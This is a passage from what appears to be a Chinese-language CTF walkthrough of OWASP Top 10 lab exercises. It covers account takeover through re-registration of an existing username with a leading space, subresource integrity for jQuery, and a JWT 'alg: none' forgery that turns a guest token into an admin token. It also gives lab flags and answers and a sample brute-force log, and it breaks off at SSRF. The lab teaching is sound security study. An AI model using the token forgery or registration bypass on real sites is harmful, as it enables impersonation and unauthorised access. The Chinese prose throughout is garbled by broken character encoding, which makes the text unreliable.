¼ï¼‰ã€‚ç°åœ¨ï¼Œå½“æ‚¨åœ¨ç”¨æˆ·åå­—æ®µä¸­è¾“å…¥è¯¥ä¿¡æ¯å¹¶è¾“å…¥å…¶ä»–å¿…éœ€ä¿¡æ¯ï¼ˆä¾‹å¦‚ç”µå­é‚®ä»¶ ID æˆ–å¯†ç ï¼‰å¹¶æäº¤è¯¥æ•°æ®æ—¶ï¼Œå®ƒå°†æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œä½†è¯¥ç”¨æˆ·å°†æ‹¥æœ‰ä¸ç®¡ç†å‘˜å¸æˆ·ç›¸åŒçš„æƒåˆ©ã€‚è¯¥æ–°ç”¨æˆ·è¿˜å¯ä»¥æŸ¥çœ‹ç”¨æˆ·Â <code>admin</code>Â ä¸‹æ˜¾ç¤ºçš„æ‰€æœ‰å†…å®¹ã€‚</p><h2 id="ç»ƒä¹ -6"><a href="#ç»ƒä¹ -6" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>è¦æŸ¥çœ‹å®é™…æ•ˆæœï¼Œè¯·è®¿é—® <a href="http://10.10.92.142:8088/">http://10.10.92.142:8088</a> å¹¶å°è¯•ä½¿ç”¨Â <code>darren</code>Â ä½œä¸ºæ‚¨çš„ç”¨æˆ·åè¿›è¡Œæ³¨å†Œã€‚</p><p>æˆ‘å…ˆä½¿ç”¨<code>darren</code>ç”¨æˆ·åæ¥è¿›è¡Œæ³¨å†Œï¼Œæ˜¾ç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼š<br><img src="/PenTest_FILE/1d6efcaae9e72c5ba33fa2ebc16e39f2_MD5.jpeg"></p><p>ä½¿ç”¨<code> darren</code>æ³¨å†Œ<br><img src="/PenTest_FILE/ad8d726b3a49f144a18d90d1b13a6e12_MD5.jpeg"></p><ul><li>æ‚¨åœ¨ darren çš„å¸æˆ·ä¸­æ‰¾åˆ°çš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šfe86079416a21a3c99937fea8874b667</li><li>ç°åœ¨å°è¯•æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œçœ‹çœ‹æ‚¨æ˜¯å¦å¯ä»¥ä»¥ Arthur èº«ä»½ç™»å½•ã€‚ä½ åœ¨äºšç‘Ÿçš„è´¦æˆ·ä¸­æ‰¾åˆ°çš„æ——å¸œæ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼š<br>d9ac0f7db4fda460ac3edeb75d75e16e</li></ul><h1 id="å…«ã€æ•°æ®å®Œæ•´æ€§"><a href="#å…«ã€æ•°æ®å®Œæ•´æ€§" class="headerlink" title="å…«ã€æ•°æ®å®Œæ•´æ€§"></a>å…«ã€æ•°æ®å®Œæ•´æ€§</h1><p>å½“è°ˆè®ºå®Œæ•´æ€§æ—¶ï¼Œæˆ‘ä»¬æŒ‡çš„æ˜¯æˆ‘ä»¬å¿…é¡»ç¡®å®šä¸€æ®µæ•°æ®æœªè¢«ä¿®æ”¹çš„èƒ½åŠ›ã€‚å®Œæ•´æ€§å¯¹äºç½‘ç»œå®‰å…¨è‡³å…³é‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬å…³å¿ƒç»´æŠ¤é‡è¦æ•°æ®å…å—ä¸å¿…è¦æˆ–æ¶æ„çš„ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æ‚¨æ­£åœ¨ä¸‹è½½æŸä¸ªåº”ç”¨ç¨‹åºçš„æœ€æ–°å®‰è£…ç¨‹åºã€‚æ‚¨å¦‚ä½•ç¡®å®šä¸‹è½½æ—¶å®ƒæ²¡æœ‰åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ä¿®æ”¹æˆ–å› ä¼ è¾“é”™è¯¯è€Œè¢«æŸåï¼Ÿ</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ‚¨ç»å¸¸ä¼šçœ‹åˆ°ä¸æ–‡ä»¶ä¸€èµ·å‘é€çš„å“ˆå¸Œå€¼ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è¯æ˜æ‚¨ä¸‹è½½çš„æ–‡ä»¶ä¿æŒå…¶å®Œæ•´æ€§å¹¶ä¸”åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰è¢«ä¿®æ”¹ã€‚å“ˆå¸Œæˆ–æ‘˜è¦åªæ˜¯å¯¹ä¸€æ®µæ•°æ®åº”ç”¨ç‰¹å®šç®—æ³•æ‰€äº§ç”Ÿçš„æ•°å­—ã€‚åœ¨é˜…è¯»æœ‰å…³å“ˆå¸Œç®—æ³•çš„å†…å®¹æ—¶ï¼Œæ‚¨ç»å¸¸ä¼šé˜…è¯»æœ‰å…³ MD5ã€SHA1ã€SHA256 æˆ–è®¸å¤šå…¶ä»–å¯ç”¨ç®—æ³•çš„å†…å®¹ã€‚</p><p>æ­¤æ¼æ´æ˜¯ç”±ä½¿ç”¨è½¯ä»¶æˆ–æ•°æ®è€Œä¸ä½¿ç”¨ä»»ä½•ç±»å‹çš„å®Œæ•´æ€§æ£€æŸ¥çš„ä»£ç æˆ–åŸºç¡€è®¾æ–½å¼•èµ·çš„ã€‚ç”±äºæ²¡æœ‰è¿›è¡Œå®Œæ•´æ€§éªŒè¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ä¼ é€’ç»™åº”ç”¨ç¨‹åºçš„è½¯ä»¶æˆ–æ•°æ®ï¼Œä»è€Œå¯¼è‡´æ„å¤–åæœã€‚</p><h2 id="è½¯ä»¶å®Œæ•´æ€§æ•…éšœ"><a href="#è½¯ä»¶å®Œæ•´æ€§æ•…éšœ" class="headerlink" title="è½¯ä»¶å®Œæ•´æ€§æ•…éšœ"></a>è½¯ä»¶å®Œæ•´æ€§æ•…éšœ</h2><p>å‡è®¾æ‚¨æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œè¯¥ç½‘ç«™ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™äº›åº“å­˜å‚¨åœ¨ä¸€äº›ä¸å—æ‚¨æ§åˆ¶çš„å¤–éƒ¨æœåŠ¡å™¨ä¸­ã€‚</p><p>è™½ç„¶è¿™å¬èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼Œä½†è¿™å®é™…ä¸Šæ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚ä»¥å¸¸ç”¨çš„ javascript åº“ jQuery ä¸ºä¾‹ã€‚å¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥ç›´æ¥ä»ä»–ä»¬çš„æœåŠ¡å™¨å°† jQuery æ·»åŠ åˆ°æ‚¨çš„ç½‘ç«™ä¸­ï¼Œè€Œæ— éœ€å®é™…ä¸‹è½½å®ƒï¼Œåªéœ€åœ¨ç½‘ç«™çš„ HTML ä»£ç ä¸­æ·»åŠ ä»¥ä¸‹è¡Œï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ç”¨æˆ·å¯¼èˆªåˆ°æ‚¨çš„ç½‘ç«™æ—¶ï¼Œå…¶æµè§ˆå™¨å°†è¯»å–å…¶ HTML ä»£ç å¹¶ä»æŒ‡å®šçš„å¤–éƒ¨æºä¸‹è½½ jQueryã€‚<br><img src="/PenTest_FILE/fe9220009f8327a05a8de266d28dc98e_MD5.jpeg"></p><p>é—®é¢˜æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…ä»¥æŸç§æ–¹å¼ä¾µå…¥ jQuery å®˜æ–¹å­˜å‚¨åº“ï¼Œä»–ä»¬å¯ä»¥æ›´æ”¹Â <code>https://code.jquery.com/jquery-3.6.1.min.js</code>Â çš„å†…å®¹ä»¥æ³¨å…¥æ¶æ„ä»£ç ã€‚å› æ­¤ï¼Œä»»ä½•è®¿é—®æ‚¨ç½‘ç«™çš„äººç°åœ¨éƒ½ä¼šæå–æ¶æ„ä»£ç å¹¶åœ¨ä¸çŸ¥ä¸è§‰ä¸­å°†å…¶æ‰§è¡Œåˆ°æµè§ˆå™¨ä¸­ã€‚è¿™æ˜¯è½¯ä»¶å®Œæ•´æ€§æ•…éšœï¼Œå› ä¸ºæ‚¨çš„ç½‘ç«™æ²¡æœ‰æ£€æŸ¥ç¬¬ä¸‰æ–¹åº“ä»¥æŸ¥çœ‹å®ƒæ˜¯å¦å·²æ›´æ”¹ã€‚ç°ä»£æµè§ˆå™¨å…è®¸æ‚¨æ²¿ç€åº“çš„ URL æŒ‡å®šå“ˆå¸Œï¼Œä»¥ä¾¿ä»…å½“ä¸‹è½½æ–‡ä»¶çš„å“ˆå¸Œä¸é¢„æœŸå€¼åŒ¹é…æ—¶æ‰æ‰§è¡Œåº“ä»£ç ã€‚è¿™ç§å®‰å…¨æœºåˆ¶ç§°ä¸ºå­èµ„æºå®Œæ•´æ€§ (SRI)</p><p>æ­£ç¡®åšæ³•æ˜¯åœ¨ HTML ä»£ç ä¸­æ’å…¥åº“çš„æ­£ç¡®æ–¹æ³•æ˜¯ä½¿ç”¨ SRI å¹¶åŒ…å«å®Œæ•´æ€§å“ˆå¸Œï¼Œè¿™æ ·ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä»¥æŸç§æ–¹å¼ä¿®æ”¹åº“ï¼Œåˆ™ä»»ä½•æµè§ˆæ‚¨ç½‘ç«™çš„å®¢æˆ·ç«¯éƒ½ä¸ä¼šæ‰§è¡Œä¿®æ”¹åçš„ç‰ˆæœ¬ã€‚ HTML ä¸­çš„å†…å®¹åº”å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‚¨å¯ä»¥è®¿é—®<a href="https://www.srihash.org/">SRI Hash Generator</a>ï¼Œèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä»»ä½•åº“çš„æ­£ç¡®çš„æ’å…¥åº“htmlä»£ç ã€‚</p><h2 id="ç»ƒä¹ -7"><a href="#ç»ƒä¹ -7" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><ul><li><a href="https://code.jquery.com/jquery-1.12.4.min.js">https://code.jquery.com/jquery-1.12.4.min.js</a> çš„ SHA-256 å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šsha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ&#x3D;</li></ul><h2 id="æ•°æ®å®Œæ•´æ€§æ•…éšœ"><a href="#æ•°æ®å®Œæ•´æ€§æ•…éšœ" class="headerlink" title="æ•°æ®å®Œæ•´æ€§æ•…éšœ"></a>æ•°æ®å®Œæ•´æ€§æ•…éšœ</h2><p>è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹ Web åº”ç”¨ç¨‹åºå¦‚ä½•ç»´æŠ¤ä¼šè¯ã€‚é€šå¸¸ï¼Œå½“ç”¨æˆ·ç™»å½•åº”ç”¨ç¨‹åºæ—¶ï¼Œä»–ä»¬å°†è¢«åˆ†é…æŸç§ä¼šè¯ä»¤ç‰Œï¼Œåªè¦ä¼šè¯æŒç»­ï¼Œå°±éœ€è¦å°†å…¶ä¿å­˜åœ¨æµè§ˆå™¨ä¸Šã€‚æ­¤ä»¤ç‰Œå°†åœ¨æ¯ä¸ªåç»­è¯·æ±‚ä¸­é‡å¤ï¼Œä»¥ä¾¿ Web åº”ç”¨ç¨‹åºçŸ¥é“æˆ‘ä»¬æ˜¯è°ã€‚è¿™äº›ä¼šè¯ä»¤ç‰Œå¯ä»¥æœ‰å¤šç§å½¢å¼ï¼Œä½†é€šå¸¸é€šè¿‡ cookie åˆ†é…ã€‚ <code>Cookie</code> æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºå°†å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸Šçš„é”®å€¼å¯¹ï¼Œå¹¶ä¸”ä¼šåœ¨æ¯æ¬¡å‘å‘å‡ºå®ƒä»¬çš„ç½‘ç«™å‘å‡ºè¯·æ±‚æ—¶è‡ªåŠ¨é‡å¤ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ­£åœ¨åˆ›å»ºä¸€ä¸ªç½‘ç»œé‚®ä»¶åº”ç”¨ç¨‹åºï¼Œåˆ™å¯ä»¥åœ¨ç™»å½•åä¸ºæ¯ä¸ªç”¨æˆ·åˆ†é…ä¸€ä¸ªåŒ…å«ç”¨æˆ·åçš„ cookieã€‚åœ¨åç»­è¯·æ±‚ä¸­ï¼Œæ‚¨çš„æµè§ˆå™¨å§‹ç»ˆä¼šåœ¨ cookie ä¸­å‘é€æ‚¨çš„ç”¨æˆ·åï¼Œä»¥ä¾¿æ‚¨çš„ Web åº”ç”¨ç¨‹åºçŸ¥é“å“ªä¸ªç”¨æˆ·æ­£åœ¨è¿æ¥ã€‚ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™å°†æ˜¯ä¸€ä¸ªç³Ÿç³•çš„æƒ³æ³•ï¼Œå› ä¸ºæ­£å¦‚æˆ‘ä»¬æåˆ°çš„ï¼Œcookie å­˜å‚¨åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œå› æ­¤å¦‚æœç”¨æˆ·ç¯¡æ”¹ cookie å¹¶æ›´æ”¹ç”¨æˆ·åï¼Œä»–ä»¬å¯èƒ½ä¼šå†’å……å…¶ä»–äººå¹¶é˜…è¯»ä»–ä»¬çš„ç”µå­é‚®ä»¶ï¼è¯¥åº”ç”¨ç¨‹åºå°†é­å—æ•°æ®å®Œæ•´æ€§æ•…éšœï¼Œå› ä¸ºå®ƒä¿¡ä»»æ”»å‡»è€…å¯ä»¥ç¯¡æ”¹çš„æ•°æ®ã€‚</p><p>è§£å†³æ­¤é—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æŸç§å®Œæ•´æ€§æœºåˆ¶æ¥ä¿è¯ cookie æ²¡æœ‰è¢«ç”¨æˆ·æ›´æ”¹ã€‚ä¸ºäº†é¿å…é‡æ–°é€ è½®å­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ä»¤ç‰Œå®ç°æ¥å…è®¸æ‚¨æ‰§è¡Œæ­¤æ“ä½œå¹¶å¤„ç†æ‰€æœ‰å¯†ç å­¦ä»¥æä¾›å®Œæ•´æ€§è¯æ˜ï¼Œè€Œæ— éœ€æ‚¨è´¹å¿ƒã€‚ <code>JSON Web Tokens (JWT) </code>å°±æ˜¯è¿™æ ·çš„ä¸€ç§å®ç°ã€‚</p><p>JWT æ˜¯éå¸¸ç®€å•çš„ä»¤ç‰Œï¼Œå…è®¸æ‚¨åœ¨ä»¤ç‰Œä¸Šå­˜å‚¨é”®å€¼å¯¹ï¼Œå¹¶ä½œä¸ºä»¤ç‰Œçš„ä¸€éƒ¨åˆ†æä¾›å®Œæ•´æ€§ã€‚è¿™ä¸ªæƒ³æ³•æ˜¯ï¼Œæ‚¨å¯ä»¥ç”Ÿæˆä»¤ç‰Œï¼Œæ‚¨å¯ä»¥å‘ç”¨æˆ·æä¾›è¿™äº›ä»¤ç‰Œï¼Œç¡®ä¿ä»–ä»¬æ— æ³•æ›´æ”¹é”®å€¼å¯¹å¹¶é€šè¿‡å®Œæ•´æ€§æ£€æŸ¥ã€‚ JWT ä»¤ç‰Œçš„ç»“æ„ç”± 3 éƒ¨åˆ†ç»„æˆï¼š<br><img src="/PenTest_FILE/ba2bad5f7c22ab8d464ce84ab5b29df7_MD5.jpeg"></p><ul><li>headerï¼šæ ‡å¤´åŒ…å«æŒ‡ç¤ºè¿™æ˜¯ JWT çš„å…ƒæ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨çš„ç­¾åç®—æ³•æ˜¯ HS256</li><li>payloadï¼šæœ‰æ•ˆè´Ÿè½½åŒ…å«é”®å€¼å¯¹ä»¥åŠ Web åº”ç”¨ç¨‹åºå¸Œæœ›å®¢æˆ·ç«¯å­˜å‚¨çš„æ•°æ®ã€‚</li><li>signatureï¼šç­¾åç±»ä¼¼äºå“ˆå¸Œï¼Œç”¨äºéªŒè¯payloadçš„å®Œæ•´æ€§ã€‚</li></ul><p>âš è¯·æ³¨æ„ï¼Œä»¤ç‰Œçš„ 3 ä¸ªéƒ¨åˆ†ä¸­çš„æ¯ä¸€ä¸ªéƒ¨åˆ†éƒ½æ˜¯ä½¿ç”¨ Base64 ç¼–ç çš„ç®€å•æ˜æ–‡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤åœ¨çº¿å·¥å…·å¯¹ Base64 è¿›è¡Œç¼–ç &#x2F;è§£ç ã€‚å°è¯•è§£ç ä»¥ä¸‹ä»¤ç‰Œçš„æ ‡å¤´å’Œæœ‰æ•ˆè´Ÿè½½ï¼ˆæ³¨æ„ï¼šç­¾ååŒ…å«äºŒè¿›åˆ¶æ•°æ®ï¼Œæ‰€ä»¥å³ä½¿ä½ è§£ç å®ƒï¼Œä½ ä¹Ÿæ— æ³•ç†è§£å®ƒçš„æ„ä¹‰ã€‚ï¼‰ï¼š<br>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw<br><img src="/PenTest_FILE/3a3f9f2357e08f821cc23172b024206c_MD5.jpeg"></p><h2 id="ç»ƒä¹ -8"><a href="#ç»ƒä¹ -8" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>ä¸ä¹…å‰ï¼Œä¸€äº›å®ç° JWT çš„åº“å­˜åœ¨æ•°æ®å®Œæ•´æ€§å¤±è´¥æ¼æ´ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼ŒJWT å®ç°äº†ç­¾åæ¥éªŒè¯æœ‰æ•ˆè´Ÿè½½æ•°æ®çš„å®Œæ•´æ€§ã€‚ä½†æ˜¯æ˜“å—æ”»å‡»çš„åº“å…è®¸æ”»å‡»è€…é€šè¿‡åŒæ—¶æ›´æ”¹ JWT ä¸­çš„ä»¥ä¸‹ä¸¤é¡¹æ¥ç»•è¿‡ç­¾åéªŒè¯ï¼š</p><ol><li>ä¿®æ”¹ä»¤ç‰Œçš„headeréƒ¨åˆ†ï¼Œä»¥ä¾¿ alg æ ‡å¤´åŒ…å«å€¼ none ã€‚</li><li>ä¿®æ”¹payloadéƒ¨åˆ†ï¼Œä½¿ username æ ‡å¤´ä¸ºæˆ‘ä»¬çš„ç›®æ ‡ç”¨æˆ·åã€‚</li><li>åˆ é™¤ç­¾åéƒ¨åˆ†ã€‚</li></ol><p>ä»¥ä¹‹å‰çš„ JWT ä¸ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ›´æ”¹payloadï¼Œä½¿ç”¨æˆ·åå˜ä¸ºâ€œadminâ€ä¸”ä¸è¿›è¡Œç­¾åæ£€æŸ¥ï¼Œæˆ‘ä»¬å¿…é¡»è§£ç æ ‡å¤´å’Œpayloadã€‚ä¿®æ”¹å®ƒä»¬ï¼Œç„¶åå°†å®ƒä»¬ç¼–ç å›æ¥ã€‚<br><img src="/PenTest_FILE/8814b0cd759d04544e9091734e581a4c_MD5.jpeg"><br>âš è¯·æ³¨æ„æˆ‘ä»¬è™½ç„¶åˆ é™¤äº†ç­¾åéƒ¨åˆ†ï¼Œä½†ä¿ç•™äº†æœ«å°¾çš„ç‚¹ã€‚</p><ul><li><p>å°è¯•ä»¥è®¿å®¢èº«ä»½ç™»å½•åº”ç”¨ç¨‹åºã€‚å®¢äººçš„è´¦æˆ·å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šguest<br><img src="/PenTest_FILE/ad04caaddfd77f8bb04dd96a00eda6a3_MD5.jpeg"></p></li><li><p>åŒ…å« JWT ä»¤ç‰Œçš„ç½‘ç«™ cookie çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šjwt-session<br>åœ¨ç™»å½•guest:guestç”¨æˆ·åè¢«è®¾ç½®äº†cookie<br><img src="/PenTest_FILE/9929af92448db8bf9009020fa98bf565_MD5.jpeg"></p></li><li><p>ä½¿ç”¨åœ¨æ­¤ä»»åŠ¡ä¸­è·å¾—çš„çŸ¥è¯†æ¥ä¿®æ”¹ JWT ä»¤ç‰Œï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºè®¤ä¸ºæ‚¨æ˜¯ç”¨æˆ·â€œadminâ€ã€‚å‘ç®¡ç†å‘˜ç”¨æˆ·æ˜¾ç¤ºçš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šTHM{Dont_take_cookies_from_strangers}</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEwNzY0NDQ4fQ.Yw2DrhzPMR9dEW4H9rV0qTEEqcS98_JTUQNF3VUs-Scæ”¹ä¸ºeyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEwNzY0NDQ4fQ==.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="ä¹ã€å®‰å…¨æ—¥å¿—ä¸ç›‘æ§å¤±è´¥"><a href="#ä¹ã€å®‰å…¨æ—¥å¿—ä¸ç›‘æ§å¤±è´¥" class="headerlink" title="ä¹ã€å®‰å…¨æ—¥å¿—ä¸ç›‘æ§å¤±è´¥"></a>ä¹ã€å®‰å…¨æ—¥å¿—ä¸ç›‘æ§å¤±è´¥</h1><p>è®¾ç½® Web åº”ç”¨ç¨‹åºæ—¶ï¼Œåº”è®°å½•ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªæ“ä½œã€‚æ—¥å¿—è®°å½•å¾ˆé‡è¦ï¼Œå› ä¸ºä¸€æ—¦å‘ç”Ÿäº‹ä»¶ï¼Œå¯ä»¥è¿½è¸ªæ”»å‡»è€…çš„æ´»åŠ¨ã€‚ä¸€æ—¦è¿½è¸ªä»–ä»¬çš„è¡Œä¸ºï¼Œå°±å¯ä»¥ç¡®å®šä»–ä»¬çš„é£é™©å’Œå½±å“ã€‚å¦‚æœæ²¡æœ‰æ—¥å¿—è®°å½•ï¼Œå°±æ— æ³•çŸ¥é“æ”»å‡»è€…åœ¨è·å¾—å¯¹ç‰¹å®š Web åº”ç”¨ç¨‹åºçš„è®¿é—®æƒé™æ—¶æ‰§è¡Œäº†å“ªäº›æ“ä½œã€‚è¿™äº›æ›´æ˜¾ç€çš„å½±å“åŒ…æ‹¬ï¼š</p><ul><li>ç›‘ç®¡æŸå®³ï¼šå¦‚æœæ”»å‡»è€…è·å¾—äº†å¯¹ç”¨æˆ·ä¸ªäººèº«ä»½ä¿¡æ¯çš„è®¿é—®æƒé™ï¼Œå¹¶ä¸”æ²¡æœ‰ç›¸å…³è®°å½•ï¼Œåˆ™æœ€ç»ˆç”¨æˆ·ä¼šå—åˆ°å½±å“ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºæ‰€æœ‰è€…å¯èƒ½ä¼šæ ¹æ®æ³•è§„å—åˆ°ç½šæ¬¾æˆ–æ›´ä¸¥å‰çš„å¤„ç½šã€‚</li><li>è¿›ä¸€æ­¥æ”»å‡»çš„é£é™©ï¼šå¦‚æœä¸è¿›è¡Œæ—¥å¿—è®°å½•ï¼Œå¯èƒ½æ— æ³•æ£€æµ‹åˆ°æ”»å‡»è€…çš„å­˜åœ¨ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…é€šè¿‡çªƒå–å‡­æ®ã€æ”»å‡»åŸºç¡€è®¾æ–½ç­‰æ–¹å¼å¯¹ Web åº”ç”¨ç¨‹åºæ‰€æœ‰è€…å‘èµ·è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚</li></ul><p>æ—¥å¿—ä¸­å­˜å‚¨çš„ä¿¡æ¯åº”åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>HTTP çŠ¶æ€ä»£ç </li><li>æ—¶é—´æˆ³</li><li>ç”¨æˆ·å</li><li>APIç«¯ç‚¹&#x2F;é¡µé¢ä½ç½®</li><li>IPåœ°å€</li></ul><p>è¿™äº›æ—¥å¿—åŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œå› æ­¤ç¡®ä¿å®ƒä»¬çš„å®‰å…¨å­˜å‚¨ä»¥åŠè¿™äº›æ—¥å¿—çš„å¤šä¸ªå‰¯æœ¬å­˜å‚¨åœ¨ä¸åŒä½ç½®éå¸¸é‡è¦ã€‚</p><p>æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œåœ¨å‘ç”Ÿè¿è§„æˆ–äº‹ä»¶åï¼Œæ—¥å¿—è®°å½•å˜å¾—æ›´åŠ é‡è¦ã€‚ç†æƒ³çš„æƒ…å†µæ˜¯è¿›è¡Œç›‘æ§ä»¥æ£€æµ‹ä»»ä½•å¯ç–‘æ´»åŠ¨ã€‚æ£€æµ‹è¿™ç§å¯ç–‘æ´»åŠ¨çš„ç›®çš„æ˜¯å®Œå…¨é˜»æ­¢æ”»å‡»è€…ï¼Œæˆ–è€…å¦‚æœæ£€æµ‹åˆ°æ”»å‡»è€…çš„å­˜åœ¨æ¯”é¢„æœŸæ™šå¾—å¤šï¼Œåˆ™å¯ä»¥å‡å°‘ä»–ä»¬é€ æˆçš„å½±å“ã€‚å¯ç–‘æ´»åŠ¨çš„å¸¸è§ç¤ºä¾‹åŒ…ã€‚</p><h2 id="ç»ƒä¹ -9"><a href="#ç»ƒä¹ -9" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>ç¤ºä¾‹æ—¥å¿—æ–‡ä»¶å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆ IP åœ°å€ï¼Ÿç­”ï¼š49.99.13.16</p></li><li><p>æ­£åœ¨è¿›è¡Œä»€ä¹ˆæ ·çš„æ”»å‡»ï¼Ÿç­”ï¼šbrute force<br>è¿™çœ‹èµ·æ¥åƒæ˜¯ä¸€ç§æš´åŠ›æ”»å‡»ï¼Œå…¶ä¸­è¿è¡Œäº†ä¸åŒçš„ç”¨æˆ·å&#x2F;å¯†ç ç»„åˆã€‚</p></li></ul><h1 id="åã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ "><a href="#åã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ " class="headerlink" title="åã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ "></a>åã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </h1><p>å½“æ”»å‡»è€…å¯ä»¥å¼ºåˆ¶ Web åº”ç”¨ç¨‹åºä»£è¡¨ä»–ä»¬å‘ä»»æ„ç›®çš„åœ°å‘é€è¯·æ±‚ï¼ŒåŒæ—¶æ§åˆ¶è¯·æ±‚æœ¬èº«çš„å†…å®¹æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§ç±»å‹çš„æ¼æ´ã€‚ SSRF æ¼æ´é€šå¸¸æºäºæˆ‘ä»¬çš„ Web 